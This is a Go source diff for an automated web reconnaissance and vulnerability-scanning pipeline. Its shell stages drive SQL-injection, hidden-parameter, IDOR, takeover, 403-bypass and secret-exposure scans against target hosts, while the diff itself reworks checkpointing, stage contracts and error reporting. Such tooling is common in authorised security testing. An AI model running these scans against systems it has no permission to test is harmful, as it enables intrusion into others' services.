 		{"hidden_params_arjun", "if command -v arjun >/dev/null 2>&1 && [ -s alive.txt ]; then head -n 100 alive.txt > arjun_targets_tmp.txt; arjun -i arjun_targets_tmp.txt -oT hidden_params.txt -t 10 --rate-limit 10; rm -f arjun_targets_tmp.txt; else : > hidden_params.txt; fi", "arjun", "grep", []string{"httpx_probe"}, 0},
 		{"ghauri_sqli", "if command -v ghauri >/dev/null 2>&1; then { head -n 200 sqli_targets.txt; grep -Ei '[?&](id|uid|order|product|category|page|article|comment|msg)=' sqli_targets.txt; } | sort -u | head -n 100 > ghauri_targets.txt; [ -s ghauri_targets.txt ] && ghauri -m ghauri_targets.txt --batch --level=2 --risk=1 --technique=BT -o ghauri_results.txt; else : > ghauri_results.txt; fi", "ghauri", "grep", []string{"sqli_targets_replace"}, 0},
-		{"reflection_run", fmt.Sprintf("%s reflection . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"scope_filter"}, 0},
-		{"paramshape_run", fmt.Sprintf("%s paramshape . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
-		{"authshape_run", fmt.Sprintf("%s authshape . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
-		{"signup_takeover_run", fmt.Sprintf("%s signup . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
-		{"idor_surface_run", fmt.Sprintf("%s idor . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"merge_all_urls"}, 0},
-		{"oauth_audit_run", fmt.Sprintf("%s oauth . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
-		{"race_scan", fmt.Sprintf("%s race . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"merge_all_urls"}, 0},
-		{"bucket_guess_run", fmt.Sprintf("%s buckets . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"tech_fingerprint"}, 0},
-		{"takeover_v2_run", fmt.Sprintf("%s takeoversvc . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
-		{"js_mine_run", fmt.Sprintf("%s jsmine . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"jsmap_scrape"}, 0},
-		{"secheaders_run", fmt.Sprintf("%s secheaders . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
-		{"backupscan_run", fmt.Sprintf("%s backupscan . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"tech_fingerprint"}, 0},
-		{"businesslogic_run", fmt.Sprintf("%s businesslogic . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"merge_all_urls"}, 0},
-		{"hostheader_run", fmt.Sprintf("%s hostheader . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
-		{"cors2_run", fmt.Sprintf("%s cors2 . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
+		{"reflection_run", fmt.Sprintf("%s reflection .", findingsRunnerRef), "findings-runner", "grep", []string{"scope_filter"}, 0},
+		{"paramshape_run", fmt.Sprintf("%s paramshape .", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
+		{"authshape_run", fmt.Sprintf("%s authshape .", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
+		{"signup_takeover_run", fmt.Sprintf("%s signup .", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
+		{"idor_surface_run", fmt.Sprintf("%s idor .", findingsRunnerRef), "findings-runner", "grep", []string{"merge_all_urls"}, 0},
+		{"oauth_audit_run", fmt.Sprintf("%s oauth .", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
+		{"race_scan", fmt.Sprintf("%s race .", findingsRunnerRef), "findings-runner", "grep", []string{"merge_all_urls"}, 0},
+		{"bucket_guess_run", fmt.Sprintf("%s buckets .", findingsRunnerRef), "findings-runner", "grep", []string{"tech_fingerprint"}, 0},
+		{"takeover_v2_run", fmt.Sprintf("%s takeoversvc .", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
+		{"js_mine_run", fmt.Sprintf("%s jsmine .", findingsRunnerRef), "findings-runner", "grep", []string{"jsmap_scrape"}, 0},
+		{"secheaders_run", fmt.Sprintf("%s secheaders .", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
+		{"backupscan_run", fmt.Sprintf("%s backupscan .", findingsRunnerRef), "findings-runner", "grep", []string{"tech_fingerprint"}, 0},
+		{"businesslogic_run", fmt.Sprintf("%s businesslogic .", findingsRunnerRef), "findings-runner", "grep", []string{"merge_all_urls"}, 0},
+		{"hostheader_run", fmt.Sprintf("%s hostheader .", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
+		{"cors2_run", fmt.Sprintf("%s cors2 .", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
 		{"nuclei_rfuf_pass", fmt.Sprintf(`if [ -n "%s" ] && [ -d "%s" ]; then
 		  nuclei -l nuclei_targets.txt -t "%s" %s "${AUTH_HEADERS[@]}" -o nuclei_rfuf_pass.txt
 		else
@@ -693,13 +808,10 @@ exit 0`, "wafw00f", "grep", []string{"httpx_probe"}, 0},
 		  : > nuclei_rfuf_pass.txt
 		fi
 		exit 0`, paths.NucleiTemplatesRfuf, paths.NucleiTemplatesRfuf, paths.NucleiTemplatesRfuf, nucleiOptimized), "nuclei", "grep", []string{"nuclei_target_merge"}, 0},
-		{"env_secrets_run", fmt.Sprintf("%s\ngo run ./cmd/findings-runner envsecrets .", authSnip), "findings-runner", "default", []string{"dirbrute_ffuf"}, 0},
-		{"git_exposure_run", fmt.Sprintf("%s\ngo run ./cmd/findings-runner gitexposure .", authSnip), "findings-runner", "default", []string{"env_secrets_run"}, 0},
-		{"paramsprayer_run", fmt.Sprintf("%s\ngo run ./cmd/findings-runner paramsprayer .", authSnip), "findings-runner", "default", []string{"url_filter_alive"}, 0},
-		{"api_version_gen", fmt.Sprintf("%s\ngo run ./cmd/findings-runner apiversion .", authSnip), "findings-runner", "default", []string{"merge_all_urls"}, 0},
-		{"nextjs_bypass_run", fmt.Sprintf("%s\ngo run ./cmd/findings-runner nextjsbypass .", authSnip), "findings-runner", "default", []string{"url_filter_alive"}, 0},
-		{"s3_audit_run", fmt.Sprintf("%s\ngo run ./cmd/findings-runner s3auditor .", authSnip), "findings-runner", "default", []string{"httpx_probe"}, 0},
-		{"idor_run", fmt.Sprintf("%s\ngo run ./cmd/findings-runner idor .", authSnip), "findings-runner", "default", []string{"merge_all_urls"}, 0},
+		{"env_secrets_run", fmt.Sprintf("%s\n%s envsecrets .", authSnip, findingsRunnerRef), "findings-runner", "default", []string{"dirbrute_ffuf"}, 0},
+		{"git_exposure_run", fmt.Sprintf("%s\n%s gitexposure .", authSnip, findingsRunnerRef), "findings-runner", "default", []string{"env_secrets_run"}, 0},
+		{"paramsprayer_run", fmt.Sprintf("%s\n%s paramsprayer .", authSnip, findingsRunnerRef), "findings-runner", "default", []string{"url_filter_alive"}, 0},
+		{"api_version_gen", fmt.Sprintf("%s\n%s apiversion .", authSnip, findingsRunnerRef), "findings-runner", "default", []string{"merge_all_urls"}, 0},
 	}
 }
 
@@ -785,6 +897,9 @@ func RunForScope(scanScope scope.Scope, resume bool, paths *config.Paths, stepTi
 	}()
 
 	steps := GetStepsForScope(scanScope, paths)
+	if err := ValidateStepContracts(steps); err != nil {
+		return fmt.Errorf("invalid pipeline definition: %w", err)
+	}
 	stepMap := make(map[string]Step)
 	for _, s := range steps {
 		stepMap[s.ID] = s
@@ -805,18 +920,32 @@ func RunForScope(scanScope scope.Scope, resume bool, paths *config.Paths, stepTi
 	}
 	semaphore := make(chan struct{}, maxConcurrent)
 
-	records, _ := coverage.LoadStageRecords(paths.WorkDir)
+	records, err := coverage.LoadStageRecords(paths.WorkDir)
+	if err != nil {
+		return fmt.Errorf("load stage records: %w", err)
+	}
+	lastRecord := make(map[string]coverage.StageRecord, len(records))
+	for _, record := range records {
+		lastRecord[record.StageID] = record
+	}
 	for _, s := range steps {
 		if cp.IsCompleted(s.ID) {
-			if softStages[s.ID] {
-				isBad := false
-				for _, r := range records {
-					if r.StageID == s.ID && (r.Status == coverage.StatusTimedOut || r.Status == coverage.StatusFailed) {
-						isBad = true
-						break
-					}
+			record, hasRecord := lastRecord[s.ID]
+			if !hasRecord {
+				continue
+			}
+			depsComplete := true
+			for _, dep := range s.Deps {
+				if !completed[dep] {
+					depsComplete = false
+					break
 				}
-				if isBad {
+			}
+			if !resumeRecordValid(paths.WorkDir, s, record, depsComplete) {
+				continue
+			}
+			if softStages[s.ID] {
+				if record.Status == coverage.StatusTimedOut || record.Status == coverage.StatusFailed || record.Status == coverage.StatusSkippedOptional {
 					continue
 				}
 			}
@@ -859,7 +988,25 @@ func RunForScope(scanScope scope.Scope, resume bool, paths *config.Paths, stepTi
 	}()
 
 	var wg sync.WaitGroup
-	errChan := make(chan error, len(steps))
+	errChan := make(chan error, len(steps)*8)
+	completeCheckpoint := func(stageID string) {
+		if err := cp.CompleteStep(stageID); err != nil {
+			errChan <- fmt.Errorf("write checkpoint for %s: %w", stageID, err)
+		}
+	}
+	writeRecord := func(record coverage.StageRecord) {
+		if step, ok := stepMap[record.StageID]; ok {
+			inputs, outputs := stageArtifacts(step)
+			record.Policy = string(stagePolicy(step.ID))
+			record.EmptyInputValid = true
+			record.CommandHash = commandDigest(step.Command)
+			record.ToolIdentity = stageToolIdentity(step.Tool)
+			record.ToolVersion = stageToolVersion(step.Tool)
+			record.InputContract = inputs
+			record.OutputContract = outputs
+		}
+		writeStageRecordOrReport(paths.WorkDir, record, errChan)
+	}
 	stopAndWait := func(runErr error) error {
 		cancel()
 		wg.Wait()
@@ -893,18 +1040,23 @@ func RunForScope(scanScope scope.Scope, resume bool, paths *config.Paths, stepTi
 			if depsMet {
 				if s.ID == "dirbrute_ffuf" && paths.SeclistsDirWordlist == "" && paths.SeclistsDirWordlistSmall == "" {
 					now := time.Now()
-					_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: s.ID, Required: stageRequired(s.ID), Dependencies: s.Deps, Status: coverage.StatusSkipped, StartedAt: now, FinishedAt: now, SkipReason: "wordlist_missing"})
+					writeRecord(coverage.StageRecord{StageID: s.ID, Required: stageRequired(s.ID), Dependencies: s.Deps, Status: coverage.StatusSkippedOptional, StartedAt: now, FinishedAt: now, SkipReason: "wordlist_missing"})
 					completed[s.ID] = true
-					cp.CompleteStep(s.ID)
+					completeCheckpoint(s.ID)
 					continue
 				}
 
 				if tool, ok := stepTools[s.ID]; ok {
 					if _, err := exec.LookPath(tool); err != nil {
 						now := time.Now()
-						_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: s.ID, Required: stageRequired(s.ID), Dependencies: s.Deps, Status: coverage.StatusSkipped, StartedAt: now, FinishedAt: now, SkipReason: "tool_missing"})
-						completed[s.ID] = true
-						cp.CompleteStep(s.ID)
+						if stageRequired(s.ID) {
+							writeRecord(coverage.StageRecord{StageID: s.ID, Required: true, Dependencies: s.Deps, Status: coverage.StatusFailed, StartedAt: now, FinishedAt: now, SkipReason: "required_tool_missing", Error: err.Error()})
+							errChan <- fmt.Errorf("required tool %s for stage %s is missing", tool, s.ID)
+						} else {
+							writeRecord(coverage.StageRecord{StageID: s.ID, Required: false, Dependencies: s.Deps, Status: coverage.StatusSkippedOptional, StartedAt: now, FinishedAt: now, SkipReason: "tool_missing"})
+							completed[s.ID] = true
+							completeCheckpoint(s.ID)
+						}
 						continue
 					}
 				}
@@ -915,12 +1067,12 @@ func RunForScope(scanScope scope.Scope, resume bool, paths *config.Paths, stepTi
 					defer wg.Done()
 					inputs, outputs := stageArtifacts(step)
 					started := time.Now()
-					_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: coverage.StatusRunning, StartedAt: started, InputArtifacts: coverage.MeasureArtifacts(paths.WorkDir, inputs), OutputArtifacts: coverage.MeasureArtifacts(paths.WorkDir, outputs)})
+					writeRecord(coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: coverage.StatusRunning, StartedAt: started, InputArtifacts: coverage.MeasureArtifacts(paths.WorkDir, inputs), OutputArtifacts: coverage.MeasureArtifacts(paths.WorkDir, outputs)})
 					select {
 					case semaphore <- struct{}{}:
 					case <-ctx.Done():
 						now := time.Now()
-						_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: coverage.StatusBlocked, StartedAt: started, FinishedAt: now, SkipReason: "cancelled_before_start"})
+						writeRecord(coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: coverage.StatusBlocked, StartedAt: started, FinishedAt: now, SkipReason: "cancelled_before_start"})
 						return
 					}
 					defer func() { <-semaphore }()
@@ -939,16 +1091,14 @@ func RunForScope(scanScope scope.Scope, resume bool, paths *config.Paths, stepTi
 					outputMetrics := coverage.MeasureArtifacts(paths.WorkDir, outputs)
 					if err != nil {
 						if softStages[step.ID] {
-							_ = ensureZeroResultArtifacts(paths.WorkDir, step.ID, outputs)
-							outputMetrics = coverage.MeasureArtifacts(paths.WorkDir, outputs)
-							_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: coverage.StatusCompletedEmpty, StartedAt: started, FinishedAt: time.Now(), ExitCode: -1, Error: err.Error(), InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
+							writeRecord(coverage.StageRecord{StageID: step.ID, Required: false, Dependencies: step.Deps, Status: coverage.StatusFailed, StartedAt: started, FinishedAt: time.Now(), ExitCode: -1, Error: err.Error(), InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
 							completed[step.ID] = true
-							cp.CompleteStep(step.ID)
+							completeCheckpoint(step.ID)
 							mu.Unlock()
 							return
 						}
 						now := time.Now()
-						_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: coverage.StatusFailed, StartedAt: started, FinishedAt: now, ExitCode: -1, Error: err.Error(), InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
+						writeRecord(coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: coverage.StatusFailed, StartedAt: started, FinishedAt: now, ExitCode: -1, Error: err.Error(), InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
 						mu.Unlock()
 						if !strings.Contains(err.Error(), "interrupted") {
 							errChan <- fmt.Errorf("step %s failed: %v", step.ID, err)
@@ -977,48 +1127,52 @@ func RunForScope(scanScope scope.Scope, resume bool, paths *config.Paths, stepTi
 					emptyInput := coverage.CountMetrics(inputMetrics) == 0
 					if res.TimedOut {
 						if softStages[step.ID] {
-							_, outputs := stageArtifacts(step)
-							_ = ensureZeroResultArtifacts(paths.WorkDir, step.ID, outputs)
-							outputMetrics = coverage.MeasureArtifacts(paths.WorkDir, outputs)
-							status = coverage.StatusCompletedEmpty
-							_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: status, StartedAt: started, FinishedAt: time.Now(), ExitCode: res.ExitCode, InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
+							status = coverage.StatusTimedOut
+							writeRecord(coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: status, StartedAt: started, FinishedAt: time.Now(), ExitCode: res.ExitCode, InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
 							completed[step.ID] = true
-							cp.CompleteStep(step.ID)
+							completeCheckpoint(step.ID)
 							mu.Unlock()
 							return
 						} else {
 							status = coverage.StatusTimedOut
 						}
-					} else if emptyInput {
-						status = coverage.StatusCompletedEmpty
+					} else if emptyInput && !missingOutput {
+						status = coverage.StatusCompletedNoInput
 					} else if res.ExitCode != 0 {
 						status = coverage.StatusFailed
 					} else if missingOutput || coverage.CountMetrics(outputMetrics) == 0 {
 						status = coverage.StatusCompletedEmpty
 					}
 
-					if status == coverage.StatusCompletedEmpty {
-						_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: status, StartedAt: started, FinishedAt: time.Now(), ExitCode: res.ExitCode, InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
+					if status == coverage.StatusCompletedEmpty || status == coverage.StatusCompletedNoInput {
+						writeRecord(coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: status, StartedAt: started, FinishedAt: time.Now(), ExitCode: res.ExitCode, InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
 						completed[step.ID] = true
-						cp.CompleteStep(step.ID)
+						completeCheckpoint(step.ID)
 						mu.Unlock()
 						return
 					}
 
 					if !success || res.TimedOut || missingOutput {
+						if softStages[step.ID] {
+							writeRecord(coverage.StageRecord{StageID: step.ID, Required: false, Dependencies: step.Deps, Status: status, StartedAt: started, FinishedAt: time.Now(), ExitCode: res.ExitCode, TimedOut: res.TimedOut, Error: fmt.Sprintf("exit_code=%d", res.ExitCode), InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
+							completed[step.ID] = true
+							completeCheckpoint(step.ID)
+							mu.Unlock()
+							return
+						}
 						if !res.TimedOut {
 							status = coverage.StatusFailed
 						}
 						now := time.Now()
-						_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: status, StartedAt: started, FinishedAt: now, ExitCode: res.ExitCode, TimedOut: res.TimedOut, Error: fmt.Sprintf("exit_code=%d", res.ExitCode), InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
+						writeRecord(coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: status, StartedAt: started, FinishedAt: now, ExitCode: res.ExitCode, TimedOut: res.TimedOut, Error: fmt.Sprintf("exit_code=%d", res.ExitCode), InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
 						mu.Unlock()
 						errChan <- fmt.Errorf("step %s incomplete (status=%s exit_code=%d)", step.ID, status, res.ExitCode)
 						return
 					}
 
-					_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: status, StartedAt: started, FinishedAt: time.Now(), ExitCode: res.ExitCode, InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
+					writeRecord(coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: status, StartedAt: started, FinishedAt: time.Now(), ExitCode: res.ExitCode, InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
 					completed[step.ID] = true
-					cp.CompleteStep(step.ID)
+					completeCheckpoint(step.ID)
 					mu.Unlock()
 				}(s)
 			}
@@ -1047,6 +1201,17 @@ func RunForScope(scanScope scope.Scope, resume bool, paths *config.Paths, stepTi
 	}
 
 	wg.Wait()
+	var completionErr error
+	for {
+		select {
+		case err := <-errChan:
+			completionErr = errors.Join(completionErr, err)
+		default:
+			goto errorsDrained
+		}
+	}
+
+errorsDrained:
 
 	uiLock.Lock()
 	stats := cli.UpdateStats(paths.WorkDir)
@@ -1054,7 +1219,7 @@ func RunForScope(scanScope scope.Scope, resume bool, paths *config.Paths, stepTi
 	uiLock.Unlock()
 
 	executor.LineCallback = nil
-	if err := finalizeRun(domain, paths, cp, steps, startTime, nil); err != nil {
+	if err := finalizeRun(domain, paths, cp, steps, startTime, completionErr); err != nil {
 		fmt.Printf("\n[!] Pipeline incomplete: %v\nOutput saved to %s\n", err, paths.WorkDir)
 		return err
 	}
@@ -1064,17 +1229,72 @@ func RunForScope(scanScope scope.Scope, resume bool, paths *config.Paths, stepTi
 }
 
 func stageRequired(stepID string) bool {
-	return true
+	return stagePolicy(stepID) == PolicyRequired
 }
 
 func ensureZeroResultArtifacts(workDir, stepID string, outputs []string) error {
 	materializeStages := map[string]bool{
-		"scope_guard":         true,
-		"amass_enum":          true,
-		"jsmap_scrape":        true,
-		"hidden_params_arjun": true,
-		"merge_brute_subs":    true,
-		"dirbrute_ffuf":       true,
+		"scope_guard":          true,
+		"subfinder":            true,
+		"assetfinder":          true,
+		"crtsh":                true,
+		"amass_enum":           true,
+		"dnsx_resolve":         true,
+		"httpx_probe":          true,
+		"tech_fingerprint":     true,
+		"api_discovery":        true,
+		"jsmap_scrape":         true,
+		"spec_parser":          true,
+		"merge_all_urls":       true,
+		"url_filter_alive":     true,
+		"merge_js_endpoints":   true,
+		"scope_filter":         true,
+		"nuclei_target_merge":  true,
+		"sqlmap_scan":          true,
+		"trufflehog_scan":      true,
+		"hidden_params_arjun":  true,
+		"merge_brute_subs":     true,
+		"dirbrute_ffuf":        true,
+		"nuclei_exposures":     true,
+		"nuclei_misconfigs":    true,
+		"nuclei_auth_scan":     true,
+		"nuclei_graphql_scan":  true,
+		"sqli_targets_replace": true,
+		"filter_testable_sqli": true,
+		"xss_targets":          true,
+		"rce_targets":          true,
+		"idor_targets":         true,
+		"ssrf_targets":         true,
+		"redirect_targets":     true,
+		"lfi_targets":          true,
+		"ghauri_sqli":          true,
+		"cors_check":           true,
+		"js_endpoints_scan":    true,
+		"dirbrute_verify_200":  true,
+		"nextjs_bypass_run":    true,
+		"bypass403":            true,
+		"s3_audit_run":         true,
+		"env_secrets_run":      true,
+		"git_exposure_run":     true,
+		"paramsprayer_run":     true,
+		"api_version_gen":      true,
+		"reflection_run":       true,
+		"paramshape_run":       true,
+		"authshape_run":        true,
+		"signup_takeover_run":  true,
+		"idor_surface_run":     true,
+		"oauth_audit_run":      true,
+		"race_scan":            true,
+		"bucket_guess_run":     true,
+		"takeover_v2_run":      true,
+		"js_mine_run":          true,
+		"secheaders_run":       true,
+		"backupscan_run":       true,
+		"businesslogic_run":    true,
+		"hostheader_run":       true,
+		"cors2_run":            true,
+		"waf_detect":           true,
+		"port_scan_naabu":      true,
 	}
 	if !materializeStages[stepID] {
 		return nil
@@ -1090,6 +1310,12 @@ func ensureZeroResultArtifacts(workDir, stepID string, outputs []string) error {
 			if err := os.MkdirAll(filepath.Dir(full), 0755); err != nil {
 				return err
 			}
+			if filepath.Ext(path) == "" {
+				if err := os.MkdirAll(full, 0755); err != nil {
+					return err
+				}
+				continue
+			}
 			file, err := os.OpenFile(full, os.O_CREATE|os.O_WRONLY, 0644)
 			if err != nil {
 				return err
@@ -1103,66 +1329,50 @@ func ensureZeroResultArtifacts(workDir, stepID string, outputs []string) error {
 }
 
 func stageArtifacts(step Step) (inputs, outputs []string) {
-	inputs = coverage.ExtractInputPaths(step.Command)
-	outputs = coverage.ExtractOutputPaths(step.Command)
-	knownInputs := map[string][]string{
-		"scope_guard":          {"subs.txt"},
-		"jsmap_scrape":         {"alive.txt"},
-		"merge_all_urls":       {"gau_urls.txt", "wayback_urls.txt", "clean_katana_urls.txt", "openapi_paths.txt"},
-		"url_filter_alive":     {"all_urls_scannable.txt"},
-		"merge_js_endpoints":   {"all_urls.txt", "js_endpoints.txt"},
-		"scope_filter":         {"all_urls.txt", "all_urls_200.txt", "js_endpoints.txt"},
-		"nuclei_target_merge":  {"alive.txt", "all_urls_200.txt", "js_endpoints.txt"},
-		"filter_testable_sqli": {"all_urls_200.txt"},
-		"xss_targets":          {"all_urls_200.txt"},
-		"rce_targets":          {"all_urls_200.txt"},
-		"idor_targets":         {"all_urls_200.txt"},
-		"ssrf_targets":         {"all_urls_200.txt"},
-		"redirect_targets":     {"all_urls_200.txt"},
-		"lfi_targets":          {"all_urls_200.txt"},
+	contract, ok := stageContracts[step.ID]
+	if !ok {
+		return nil, nil
 	}
-	known := map[string][]string{
-		"scope_guard":         {"scope.json", "in_scope_hosts.txt", "out_of_scope_hosts.txt", "scoped_subs.txt"},
-		"subfinder":           {"subfinder.txt"},
-		"assetfinder":         {"assetfinder.txt"},
-		"crtsh":               {"crtsh.txt"},
-		"amass_enum":          {"amass_raw.txt"},
-		"dnsx_resolve":        {"live_subs.txt"},
-		"httpx_probe":         {"alive.txt"},
-		"jsmap_scrape":        {"js_assets.txt", "js_endpoints.txt", "jsmap_status.txt"},
-		"merge_all_urls":      {"all_urls.txt"},
-		"url_filter_alive":    {"all_urls_200.txt"},
-		"merge_js_endpoints":  {"all_urls.txt", "js_endpoints_full.txt"},
-		"scope_filter":        {"all_urls.txt", "all_urls_200.txt", "js_endpoints.txt", "scope_filter_status.txt"},
-		"nuclei_target_merge": {"nuclei_targets.txt"},
-		"sqlmap_scan":         {"sqlmap_targets.txt", "sqlmap_status.json"},
-		"trufflehog_scan":     {"trufflehog_status.json", "trufflehog_results.txt"},
-		"nuclei_exposures":    {"credentials_found.txt"},
-		"nuclei_misconfigs":   {"misconfigs.txt"},
-		"nuclei_auth_scan":    {"auth_results.txt"},
-		"nuclei_graphql_scan": {"graphql_exposed.txt"},
-		"cors_check":          {"cors_findings.txt"},
-		"dirbrute_verify_200": {"ffuf_dirs_200.txt"},
-		"js_endpoints_scan":   {"js_endpoint_findings.txt"},
-		"ghauri_sqli":         {"ghauri_results.txt"},
-		"hidden_params_arjun": {"hidden_params.txt"},
-	}
-	inputs = append(inputs, knownInputs[step.ID]...)
-	outputs = append(outputs, known[step.ID]...)
-	return uniquePaths(inputs), uniquePaths(outputs)
+	return append([]string(nil), contract.Inputs...), append([]string(nil), contract.Outputs...)
 }
 
-func uniquePaths(paths []string) []string {
-	seen := make(map[string]bool)
-	out := make([]string, 0, len(paths))
-	for _, path := range paths {
-		if path == "" || seen[path] {
-			continue
+// ValidateStepContracts catches execution paths that only work from the
+// source checkout, duplicate IDs, or missing declarative stage contracts.
+func ValidateStepContracts(steps []Step) error {
+	seen := make(map[string]bool, len(steps))
+	for _, step := range steps {
+		if step.ID == "" || seen[step.ID] {
+			return fmt.Errorf("empty or duplicate stage ID %q", step.ID)
 		}
-		seen[path] = true
-		out = append(out, path)
+		seen[step.ID] = true
+		contract, ok := stageContracts[step.ID]
+		if !ok {
+			return fmt.Errorf("stage %s has no declarative contract", step.ID)
+		}
+		if len(contract.Outputs) == 0 {
+			return fmt.Errorf("stage %s has no declared outputs", step.ID)
+		}
+		if contract.Policy != PolicyRequired && contract.Policy != PolicyOptional && contract.Policy != PolicyConditional {
+			return fmt.Errorf("stage %s has invalid policy %q", step.ID, contract.Policy)
+		}
+		if (contract.Policy != PolicyRequired) != softStages[step.ID] {
+			return fmt.Errorf("stage %s policy %s conflicts with scheduler policy", step.ID, contract.Policy)
+		}
+		if step.Tool == "findings-runner" || step.Tool == "filter-testable" {
+			binary := selfBin()
+			verb := "findings"
+			if step.Tool == "filter-testable" {
+				verb = "filter-testable"
+			}
+			if binary == "" || !filepath.IsAbs(binary) || strings.Contains(step.Command, "go run ./cmd/") || !strings.Contains(step.Command, binary+" "+verb) {
+				return fmt.Errorf("internal stage %s does not use the resolved absolute RFUF binary", step.ID)
+			}
+		}
 	}
-	return out
+	if len(seen) != len(stageContracts) {
+		return fmt.Errorf("declarative contracts contain %d stages but pipeline defines %d", len(stageContracts), len(seen))
+	}
+	return nil
 }
 
 func writeBlockedRecords(workDir string, steps []Step) error {
@@ -1196,7 +1406,19 @@ func finalizeRun(domain string, paths *config.Paths, cp *checkpoint.Checkpoint, 
 	}
 	if err == nil {
 		report = coverage.Evaluate(domain, startedAt, time.Now(), stageRecords)
+		authMode, authErr := authenticationMode(paths.WorkDir)
+		if authErr != nil {
+			report.Status = "INCOMPLETE"
+			report.RequiredIssues = append(report.RequiredIssues, "authentication status unavailable")
+			if runErr == nil {
+				runErr = authErr
+			}
+		}
+		report.Authentication = authMode
 		if writeErr := coverage.WriteReport(paths.WorkDir, report); writeErr != nil && runErr == nil {
+			runErr = writeErr
+		}
+		if writeErr := coverage.WriteArtifactManifest(paths.WorkDir, stageRecords); writeErr != nil && runErr == nil {
 			runErr = writeErr
 		}
 		if report.Status != "COMPLETE" && runErr == nil {
